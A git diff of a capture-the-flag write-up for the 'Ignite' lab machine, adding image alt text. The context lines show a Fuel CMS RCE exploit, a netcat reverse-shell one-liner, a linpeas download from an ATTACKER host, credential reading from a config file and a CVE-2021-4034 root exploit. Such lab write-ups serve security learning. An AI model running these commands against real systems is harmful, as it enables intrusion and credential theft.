@@ -32,23 +32,23 @@ nmap -A -p- TARGET --min-rate 10000 -oN ignite.nmap
 | -------- | ----------- |
 | 80       | http        |
 
-![](https://cdn.ziomsec.com/ignite/1.webp)
+![performing an nmap scan on ignite machine](https://cdn.ziomsec.com/ignite/1.webp)
 
 ## Initial Foothold
 
 The server only had port 80 open. So I accessed it on my browser and found a CMS called Fuel.
 
-![](https://cdn.ziomsec.com/ignite/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/ignite/2.webp)
 
 When I scrolled to the bottom, I found the admin endpoint and credentials to log in.
 
-![](https://cdn.ziomsec.com/ignite/3.webp)
+![discovering the admin credentials](https://cdn.ziomsec.com/ignite/3.webp)
 
 I then visited the endpoint and logged in as admin
 
-![](https://cdn.ziomsec.com/ignite/4.webp)
+![logging into the cms as admin](https://cdn.ziomsec.com/ignite/4.webp)
 
-![](https://cdn.ziomsec.com/ignite/5.webp)
+![logging into the cms as admin](https://cdn.ziomsec.com/ignite/5.webp)
 
 I didn't find anything useful in the CMS so I looked for exploits related to the CMS version.
 
@@ -57,7 +57,7 @@ searchsploit 'fuel cms 1.4'
 searchsploit -m php/webapps/50477.py
 ```
 
-![](https://cdn.ziomsec.com/ignite/6.webp)
+![searching for exploits on exploitdb](https://cdn.ziomsec.com/ignite/6.webp)
 
 I found and downloaded a python exploit that provided RCE.
 
@@ -65,7 +65,7 @@ I found and downloaded a python exploit that provided RCE.
 python 50477.py -u http://TARGET/
 ```
 
-![](https://cdn.ziomsec.com/ignite/7.webp)
+![running the rce exploit](https://cdn.ziomsec.com/ignite/7.webp)
 
 I used the RCE to get a reverse shell.
 
@@ -73,9 +73,9 @@ I used the RCE to get a reverse shell.
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc TARGET 1234 >/tmp/f
 ```
 
-![](https://cdn.ziomsec.com/ignite/8.webp)
+![getting a reverse shell using the exploit](https://cdn.ziomsec.com/ignite/8.webp)
 
-![](https://cdn.ziomsec.com/ignite/9.webp)
+![getting a reverse shell using the exploit](https://cdn.ziomsec.com/ignite/9.webp)
 
 After getting a reverse shell, I captured the user flag from the **www-data** user's home directory.
 
@@ -83,7 +83,7 @@ After getting a reverse shell, I captured the user flag from the **www-data** us
 cat /home/www-data/flag.txt
 ```
 
-![](https://cdn.ziomsec.com/ignite/10.webp)
+![capturing the user flag](https://cdn.ziomsec.com/ignite/10.webp)
 
 ## Privilege Escalation 
 
@@ -98,7 +98,7 @@ wget 'http://ATTACKER/linpeas.sh'
 chmod +x linpeas.sh
 ```
 
-![](https://cdn.ziomsec.com/ignite/11.webp)
+![downloading linPEAS on ignite machine](https://cdn.ziomsec.com/ignite/11.webp)
 
 I then ran the script
 
@@ -108,7 +108,7 @@ I then ran the script
 
 It found hardcoded credentials inside a backup file.
 
-![](https://cdn.ziomsec.com/ignite/12.webp)
+![discovering hardcoded creds with linPEAS](https://cdn.ziomsec.com/ignite/12.webp)
 
 I manually visited the file and found that the password belonged to the root user.
 
@@ -116,13 +116,13 @@ I manually visited the file and found that the password belonged to the root use
 cat /var/www/html/fuel/application/config/database.php
 ```
 
-![](https://cdn.ziomsec.com/ignite/13.webp)
+![validating the credentials from the config](https://cdn.ziomsec.com/ignite/13.webp)
 
-![](https://cdn.ziomsec.com/ignite/14.webp)
+![validating the credentials from the config](https://cdn.ziomsec.com/ignite/14.webp)
 
 I switched to root user and captured the root flag from `/root`.
 
-![](https://cdn.ziomsec.com/ignite/15.webp)
+![capturing the root flag](https://cdn.ziomsec.com/ignite/15.webp)
 
 ### CVE-2021-4034
 
@@ -134,13 +134,13 @@ chmod +x les.sh
 ./les.sh
 ```
 
-![](https://cdn.ziomsec.com/ignite/16.webp)
+![running linux exploit suggester](https://cdn.ziomsec.com/ignite/16.webp)
 
 The script identified the target to be vulnerable to CVE-2021-4034 so I downloaded the exploit related to it.
 
-![](https://cdn.ziomsec.com/ignite/17.webp)
+![downloading exploit for CVE-2021-4034](https://cdn.ziomsec.com/ignite/17.webp)
 
-![](https://cdn.ziomsec.com/ignite/18.webp)
+![downloading exploit for CVE-2021-4034](https://cdn.ziomsec.com/ignite/18.webp)
 
 I compiled the exploit on the target and ran it to get a root shell
 
@@ -152,11 +152,11 @@ make
 ./cve-2021-4034
 ```
 
-![](https://cdn.ziomsec.com/ignite/19.webp)
+![compiling the exploit and running it for root access](https://cdn.ziomsec.com/ignite/19.webp)
 
 Finally, I captured the root flag from `/root`.
 
-![](https://cdn.ziomsec.com/ignite/20.webp)
+![capturing the root flag](https://cdn.ziomsec.com/ignite/20.webp)
 
 That's it from my side!
 Until next time :)
